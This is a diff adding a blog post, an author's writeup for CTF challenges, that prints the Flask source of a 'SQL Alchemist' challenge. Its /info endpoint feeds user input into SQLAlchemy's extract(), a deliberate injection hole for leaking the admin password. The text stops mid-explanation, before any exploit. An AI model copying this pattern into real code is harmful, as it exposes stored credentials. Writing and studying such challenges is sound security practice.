@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #38b48b;
+            --font-size: 17.5px;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Sknb Ctf Author Writeup</title>
+    <meta name="description" content="This is the first time I made challenges for ctf. I made the challenges in the following.
+SQL Alchemist Auth Delegation Parse Parse Parse Your Name
+I apologize …">
+    <meta name="keywords" content='sota70, security, web'>
+
+    <meta property="og:url" content="http://localhost:1313/posts/sknb-ctf-author-writeup/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Sknb Ctf Author Writeup">
+    <meta property="og:description" content="This is the first time I made challenges for ctf. I made the challenges in the following.
+SQL Alchemist Auth Delegation Parse Parse Parse Your Name
+I apologize …">
+    <meta property="og:image" content="http://localhost:1313/images/ginchan.jpg">
+    <meta property="og:image:secure_url" content="http://localhost:1313/images/ginchan.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Sknb Ctf Author Writeup">
+    <meta name="twitter:description" content="This is the first time I made challenges for ctf. I made the challenges in the following.
+SQL Alchemist Auth Delegation Parse Parse Parse Your Name
+I apologize …">
+    <meta property="twitter:domain" content="http://localhost:1313/posts/sknb-ctf-author-writeup/">
+    <meta property="twitter:url" content="http://localhost:1313/posts/sknb-ctf-author-writeup/">
+    <meta name="twitter:image" content="http://localhost:1313/images/ginchan.jpg">
+
+    
+    <link rel="canonical" href="http://localhost:1313/posts/sknb-ctf-author-writeup/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/css/dark.min.css">
+
+    
+    <script src="/js/bundle.min.3eb19cb61dde9e37b9522867f3e024aeb68e26ab8e03252e46e365abcb19acf7.js" integrity="sha256-PrGcth3enje5Uihn8&#43;AkrraOJquOAyUuRuNlq8sZrPc="></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="http://localhost:1313/">
+                <img src='/images/ginchan.jpg' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="http://localhost:1313/">sota70の独り言</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="http://localhost:1313/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/sota70" aria-label="github" ><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="http://localhost:1313/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/sota70" ><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Sknb Ctf Author Writeup</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              November 24, 2025
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>This is the first time I made challenges for ctf. I made the challenges in the following.</p>
+<ul>
+<li>SQL Alchemist</li>
+<li>Auth Delegation</li>
+<li>Parse Parse Parse</li>
+<li>Your Name<br>
+I apologize for troubles about my challenges. Next time, I will check carefully in production environment.</li>
+</ul>
+<h1 id="sql-alchemist">SQL Alchemist</h1>
+<p>The following is the challenge source code</p>
+<p>app.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, session, render_template, redirect
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sqlalchemy <span style="color:#f92672">import</span> create_engine, extract, select, Column, Integer, String, Date
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sqlalchemy.orm <span style="color:#f92672">import</span> DeclarativeBase, Session
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MYSQL_USER <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_USER&#34;</span>]
+</span></span><span style="display:flex;"><span>MYSQL_PASSWORD <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_PASSWORD&#34;</span>]
+</span></span><span style="display:flex;"><span>MYSQL_DATABASE <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;MYSQL_DATABASE&#34;</span>]
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#34;GZCTF_FLAG&#34;</span>]
+</span></span><span style="display:flex;"><span>engine <span style="color:#f92672">=</span> create_engine(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;mysql+mysqlconnector://</span><span style="color:#e6db74">{</span>MYSQL_USER<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>MYSQL_PASSWORD<span style="color:#e6db74">}</span><span style="color:#e6db74">@db/</span><span style="color:#e6db74">{</span>MYSQL_DATABASE<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>config[<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>] <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">32</span>)<span style="color:#f92672">.</span>hex()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Base</span>(DeclarativeBase):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span>(Base):
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __tablename__ <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;user&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    id <span style="color:#f92672">=</span> Column(Integer, primary_key<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> Column(String(length<span style="color:#f92672">=</span><span style="color:#ae81ff">255</span>), unique<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> Column(String(length<span style="color:#f92672">=</span><span style="color:#ae81ff">255</span>))
+</span></span><span style="display:flex;"><span>    timestamp <span style="color:#f92672">=</span> Column(Date)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Base<span style="color:#f92672">.</span>metadata<span style="color:#f92672">.</span>create_all(bind<span style="color:#f92672">=</span>engine)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add_user</span>(username, password):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> Session(engine) <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>add(User(username<span style="color:#f92672">=</span>username, password<span style="color:#f92672">=</span>password, timestamp<span style="color:#f92672">=</span>datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()))
+</span></span><span style="display:flex;"><span>            session<span style="color:#f92672">.</span>commit()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_user</span>(username, password):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> Session(engine) <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span>            stmt <span style="color:#f92672">=</span> select(User)\
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">.</span>where(User<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username)\
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">.</span>where(User<span style="color:#f92672">.</span>password <span style="color:#f92672">==</span> password)
+</span></span><span style="display:flex;"><span>            user_data <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>scalars(stmt)<span style="color:#f92672">.</span>one_or_none()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user_data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> user_data
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.get</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> session<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;home.html&#34;</span>, is_authenticated<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;home.html&#34;</span>, user<span style="color:#f92672">=</span>username, is_authenticated<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.get</span>(<span style="color:#e6db74">&#34;/login&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_login_page</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;message&#34;</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, message<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.get</span>(<span style="color:#e6db74">&#34;/register&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_register_page</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;message&#34;</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, message<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;message&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.get</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> session<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;not authenticated&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> session[<span style="color:#e6db74">&#34;username&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;you are not admin&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> FLAG
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/login&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login?message=data not found&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys() <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login?message=username or password not found&#34;</span>)
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(username, str) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> isinstance(password, str):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login?message=invalid request&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> find_user(username, password)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login?message=invalid credentials&#34;</span>)
+</span></span><span style="display:flex;"><span>    session[<span style="color:#e6db74">&#34;username&#34;</span>] <span style="color:#f92672">=</span> user<span style="color:#f92672">.</span>username
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/register&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/register?message=data not found&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys() <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;password&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/register?message=username or password not found&#34;</span>)
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;username&#34;</span>]
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> data[<span style="color:#e6db74">&#34;password&#34;</span>]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> find_user(username, password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/register?message=user already exists&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(username, str) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> isinstance(password, str):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/register?message=invalid request&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> add_user(username, password):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/register?message=something went wrong&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> session <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> session<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        session<span style="color:#f92672">.</span>clear()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/login&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/info&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_user</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;data not found&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys() <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;field&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;username or field not found&#34;</span>
+</span></span><span style="display:flex;"><span>    username <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)
+</span></span><span style="display:flex;"><span>    field <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;field&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(username, str) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> isinstance(field, str):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid request&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> Session(engine) <span style="color:#66d9ef">as</span> session:
+</span></span><span style="display:flex;"><span>            user_data <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>query(
+</span></span><span style="display:flex;"><span>                User<span style="color:#f92672">.</span>username,
+</span></span><span style="display:flex;"><span>                extract(field, User<span style="color:#f92672">.</span>timestamp)
+</span></span><span style="display:flex;"><span>            )<span style="color:#f92672">.</span>where(User<span style="color:#f92672">.</span>username <span style="color:#f92672">==</span> username)<span style="color:#f92672">.</span>first()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> str(user_data)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;something went wrong&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">init</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> add_user(<span style="color:#e6db74">&#34;admin&#34;</span>, random<span style="color:#f92672">.</span>randbytes(<span style="color:#ae81ff">16</span>)<span style="color:#f92672">.</span>hex()):
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;something went wrong during user init&#34;</span>)
+</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">3000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>init()
+</span></span></code></pre></div><p>Since admin can get flag, the goal is to login as admin. However, the admin password is randomized so leaking the admin password is needed. Looking at the source code, extract function is called when making a request to /info.</p>
+<p>app.py</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-py" data-lang="py"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">125</span><span><span style="color:#a6e22e">@app.post</span>(<span style="color:#e6db74">&#34;/info&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">126</span><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show_user</span>():
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">127</span><span>    data <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">128</span><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">129</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;data not found&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">130</span><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys() <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">&#34;field&#34;</span> <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>keys():
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">131</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;username or field not found&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">132</span><span>    username <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">133</span><span>    field <span style="color:#f92672">=</span> data<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;field&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">134</span><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> isinstance(username, str) <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> isinstance(field, str):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">135</span><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;invalid request&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">136</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">137</span><span>    <span style="color:#66d9ef">try</span>:
